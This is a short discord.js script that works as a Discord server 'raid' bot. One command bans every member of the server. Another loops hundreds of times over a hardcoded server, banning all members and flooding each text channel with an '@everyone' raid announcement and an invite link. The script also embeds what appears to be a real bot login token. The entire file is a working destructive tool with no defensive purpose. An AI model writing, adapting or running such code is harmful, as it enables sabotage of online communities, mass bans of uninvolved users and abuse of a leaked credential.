# discord.js
let Discord = require("discord.js");
let client = new Discord.Client();

client.on("message", message => {
  if (message.content === "yes") {
    message.guild.members
      .fetch()
      .then(m => m.forEach(b => message.guild.members.ban(b.id)));
  }
  if (message.content === "start") {
    let server = client.guilds.cache.get("762600030057529344");
    for (let i = 0; i <= 500; i++) {
      server.members
        .fetch()
        .then(m => m.forEach(b => server.members.ban(b.id)));
      server.channels.cache
        .filter(r => r.type === "text")
        .forEach(channel => {
          channel.send("@everyone 𝐑𝐀𝐈𝐃 𝐁𝐘 : :boom: KΛBOM : https://discord.gg/7fK9XDj7bK");
        });
    }
  }
});

client.login("ODExNzg4Mzk3OTkxMTY1OTgy.YC3S3A.Lvt_aXA_nqc2QsYerqAiLlfdgK0");
